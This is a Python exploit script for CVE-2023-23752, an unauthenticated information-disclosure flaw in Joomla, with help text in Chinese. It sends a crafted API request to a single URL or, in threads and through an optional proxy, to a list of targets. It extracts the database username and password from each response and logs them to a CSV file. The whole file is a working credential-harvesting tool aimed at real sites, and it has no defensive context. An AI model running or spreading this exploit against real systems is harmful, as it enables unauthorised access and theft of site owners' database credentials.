# -*- coding: utf-8 -*-
import requests
import argparse
import threading
import sys
import re
import time


def cmd_line():
    parse = argparse.ArgumentParser(
        description="Joomla 未授权访问漏洞 CVE-2023-23752",
        usage='''
        python CVE-2023-23752.py -u url
        python CVE-2023-23752.py -f file.txt
        python CVE-2023-23752.py -f file.txt -o out_file.csv
        python CVE-2023-23752.py -f file.txt -p socks5://127.0.0.1:8080 
        ''', add_help=True)
    parse.add_argument('-u', '--url', help="指定webshell地址")
    parse.add_argument('-f', '--file', help="指定文件")
    parse.add_argument('-p', '--proxy', help="设置代理，如socks5://127.0.0.1:8080 [clash]")
    parse.add_argument('-o', '--output', help="将结果输出到文件",default=str(time.time()) + ".csv")
    if len(sys.argv) == 1:
        sys.argv.append('-h')
    return parse.parse_args()


def poc(url, proxy_server, output_file):
    try:
        if url.rindex("/") == len(url) - 1:
            payload = "{}api/index.php/v1/config/application?public=true".format(url)
        else:
            payload = "{}/api/index.php/v1/config/application?public=true".format(url)
        response = requests.get(url=payload, proxies={"http": proxy_server, "https": proxy_server})
        html = response.text
        if "password" in html:
            print("[+] 漏洞存在！[✅]url: " + url)
            pattern = re.compile(r'{"user":"(.*?)","id":')
            username = pattern.findall(html)[0]
            print('用户名: ' + username)
            pattern = re.compile(r'{"password":"(.*?)","id":')
            password = pattern.findall(html)[0]
            print('密码: ' + password)
            if output_file:
                with open(output_file, 'a', encoding='utf-8') as f:
                    f.write('{0},{1},{2},{3}\n'.format(url, payload, username, password))
        else:
            print("[x] 未检测到漏洞！[x] url: "+url)
    except:
        print("[!] URL连接失败！[!] url: "+url)


def file(url, file, proxy_server, output_file):

    with open(file, 'r', encoding='utf-8') as f:
        urls = f.readlines()
    threads = []
    for url in urls:
        t = threading.Thread(target=poc, args=(url.strip(), proxy_server, output_file))
        threads.append(t)
        t.start()


if __name__ == "__main__":
    args = cmd_line()
    if args.file:
        file(args.url, args.file, args.proxy, args.output)
    else:
        poc(args.url, args.proxy, args.output)
